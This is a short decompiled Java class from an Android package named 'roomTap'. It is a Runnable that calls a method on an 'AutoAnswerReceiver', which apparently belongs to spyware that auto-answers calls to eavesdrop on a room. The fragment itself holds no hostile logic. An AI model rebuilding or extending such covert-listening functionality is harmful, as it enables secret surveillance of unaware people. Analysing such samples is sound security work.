package com.network.android.roomTap;

import android.content.Context;

/* access modifiers changed from: package-private */
public final class i implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Context f120a;
    final /* synthetic */ AutoAnswerReceiver b;

    i(AutoAnswerReceiver autoAnswerReceiver, Context context) {
        this.b = autoAnswerReceiver;
        this.f120a = context;
    }

    public final void run() {
        AutoAnswerReceiver.h(this.f120a);
    }
}
